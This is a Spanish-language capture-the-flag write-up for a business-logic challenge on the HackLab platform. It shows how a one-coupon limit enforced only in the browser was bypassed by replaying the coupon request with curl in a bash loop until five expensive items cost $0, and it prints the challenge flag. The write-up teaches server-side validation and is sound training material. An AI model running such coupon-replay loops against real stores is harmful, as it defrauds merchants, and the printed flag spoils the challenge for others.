# Writeup — CTF "ProMarket" (Lógica de Negocio)

**Plataforma:** HackLab (SoftwareSeguro)  
**Edición:** HackLab 2026  
**Categoría:** Lógica de negocio  
**Puntaje:** 20 puntos  
**Flag:** `058c596e89d2e906e2918416d5c6cd8e`  

---

## 📌 Enunciado

Una nueva tienda online está ofreciendo una promoción imperdible: si comprás los 5 ítems marcados te dan un premio. ¿Qué es el premio? Lo descubrirás cuando lo ganes.

Tu amigo Juan quiere que lo ayudes a conseguir este premio, pero está corto de dinero.

Juan te pasó su cuenta:
- **Usuario:** `juancho`
- **Contraseña:** `juancito445`

**Objetivo:** Ayudá a Juan a comprar los 5 ítems marcados y conseguir el premio. La flag es el premio que entrega la tienda al completar la promoción.

---

## 1. Planteo inicial y categoría

El enunciado presentaba:

- Una tienda con una promo: comprar 5 ítems marcados con ★ **"Setup Definitivo"** y obtener un premio.
- Una cuenta de usuario (`juancho` / `juancito445`) con saldo **insuficiente** para pagar esos 5 productos.
- El objetivo explícito: "ayudá a Juan a conseguir el premio" pese a no tener plata.

Esto descarta de entrada categorías como SQLi, XSS o Auth: no hay que romper el login ni inyectar código, el usuario ya tiene acceso legítimo. El problema es puramente de **cómo la aplicación maneja las reglas de la compra** (precios, descuentos, validaciones de cupón) — el sello distintivo de **Lógica de negocio**.

---

## 2. Reconocimiento inicial

Login con las credenciales provistas y exploración de la tienda:

- **Saldo de Juan:** $100.000.
- **5 productos del combo** (marcados ★ Setup Definitivo):
  - Notebook Gamer 16" RTX — $2.499.000
  - Placa de video RTX 4090 24GB — $1.899.000
  - Monitor curvo 34" UltraWide — $649.000
  - Teclado mecánico RGB — $189.000
  - Auriculares con cancelación de ruido — $349.000
  - **Subtotal total: $5.585.000**
- Un cupón de bienvenida visible en la propia página: **`HACKLAB20`** (20% OFF).

Incluso con el cupón aplicado una sola vez, $5.585.000 con 20% de descuento siguen siendo ~$4.468.000 — muy por encima de los $100.000 disponibles. Había que encontrar una falla más profunda que un simple descuento.

---

## 3. Análisis del flujo de compra

Usando las DevTools del navegador (pestaña **Network**) se inspeccionó cada acción:

### Agregar producto al carrito
```http
POST /carrito/agregar
Body: id=4
```
Solo viaja el `id` del producto desde el cliente. El precio se calcula del lado del servidor a partir de ese id — **descartado** un ataque de manipulación directa de precio en este endpoint.

### El carrito (HTML)
Al revisar el HTML de `/carrito` se encontró:

```html
<form method="post" action="/carrito/cupon" class="cupon-form">
  <input name="codigo" placeholder="Código de cupón" ...>
  <button type="submit" class="btn" disabled>Aplicar</button>
</form>
<p class="ayuda">Máximo un cupón por compra.</p>
```

Dos detalles clave:
1. El botón "Aplicar" se deshabilita (`disabled`) una vez que ya hay un cupón puesto — pero eso es una restricción puramente visual/HTML, del lado del cliente.
2. El texto "Máximo un cupón por compra" es una **promesa de la interfaz**, no necesariamente algo que el backend haga cumplir.

Esa combinación es la señal clásica de una validación que solo existe en el frontend.

---

## 4. Explotando la falla: bypass del límite de cupones

Se evitó el botón deshabilitado enviando la request directamente con `curl`, usando la cookie de sesión capturada en el navegador:

```bash
curl -i -X POST https://.../carrito/cupon \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: cf_clearance=...; promarket_sesion=..." \
  --data "codigo=HACKLAB20"
```

Resultado: `HTTP/2 303` (redirect a `/carrito`), sin ningún rechazo.

Se verificó el estado del carrito después de aplicarlo una segunda vez:

```html
<ul class="cupones">
  <li>🏷️ HACKLAB20 <span>-20%</span></li>
  <li>🏷️ HACKLAB20 <span>-20%</span></li>
</ul>
...
<dt>Descuento (40%)</dt><dd>- $ 75.600,00</dd>
```

**Confirmado:** el servidor no validaba que el cupón ya estuviera aplicado. Cada POST a `/carrito/cupon` con el mismo código sumaba otro 20% de descuento, sin tope.

---

## 5. Escalando el descuento hasta $0

Con la falla confirmada, el ataque era trivial de automatizar: aplicar el cupón en loop hasta que el descuento acumulado superara el 100% del total.

```bash
COOKIE="cf_clearance=...; promarket_sesion=..."

for i in $(seq 1 30); do
  curl -s -o /dev/null -X POST https://.../carrito/cupon \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: $COOKIE" \
    --data "codigo=HACKLAB20"
  sleep 0.3
done
```

Con el teclado en el carrito, bastaron ~30 repeticiones para que el total colapsara a $0 y la compra se disparara en $0 pagado — más barato que el saldo disponible.

Al revisar "Mis compras" quedó claro que esta primera tanda había comprado 4 de los 5 ítems del combo (faltaba el **Monitor curvo 34" UltraWide**), así que se repitió el mismo procedimiento específicamente para ese producto.

---

## 6. Completando el combo

Se identificó el `id` del Monitor curvo inspeccionando el HTML de la tienda:

```bash
curl -s https://.../ -H "Cookie: $COOKIE" | grep -A15 "Monitor curvo"
# → id = 3
```

Y se repitió el ciclo completo para ese producto:

```bash
# 1. Agregar el monitor
curl -s -o /dev/null -X POST https://.../carrito/agregar \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $COOKIE" \
  --data "id=3"

# 2. Aplicar el cupón muchas veces para cubrir el precio más alto del monitor
for i in $(seq 1 40); do
  curl -s -o /dev/null -X POST https://.../carrito/cupon \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: $COOKIE" \
    --data "codigo=HACKLAB20"
  sleep 0.2
done

# 3. Confirmar el pago
curl -s -X POST https://.../carrito/pagar -H "Cookie: $COOKIE"
```

---

## 7. Resultado

Con los 5 productos del Setup Definitivo comprados (pagando $0 en total, saldo de Juan intacto en $100.000), la plataforma entregó automáticamente el premio:

```text
🎉 ¡Felicitaciones!
Flag: 058c596e89d2e906e2918416d5c6cd8e
```

---

## 8. Cadena lógica completa, resumida

```
Enunciado: comprar 5 productos caros con saldo insuficiente
        ↓
Categoría: Lógica de negocio
        ↓
Precio del producto se calcula server-side al agregar al carrito
        → descarta manipular precio directo en /carrito/agregar
        ↓
HTML del carrito: botón "Aplicar cupón" se deshabilita tras un uso
        + texto "Máximo un cupón por compra"
        → sospecha: validación solo client-side
        ↓
Bypass con curl: enviar /carrito/cupon directamente, sin pasar por el botón
        ↓
Confirmado: el servidor no valida duplicados → cada aplicación suma +20%
        ↓
Loop de requests → descuento acumulado supera el 100% → total = $0
        ↓
Repetir para el producto faltante (Monitor curvo, id=3)
        ↓
Pagar con los 5 ítems del combo, costo real: $0
        ↓
Flag entregada: 058c596e89d2e906e2918416d5c6cd8e
```

**Lección metodológica central:** cuando una interfaz "previene" una acción deshabilitando un botón o mostrando un mensaje de advertencia (*"máximo un cupón por compra"*), eso no es una garantía de seguridad — es, en el mejor de los casos, una comodidad de UX. La validación real tiene que vivir en el servidor; acá no existía, y bastó con hablarle directo al backend (vía `curl`, sin pasar por el frontend) para explotarlo.
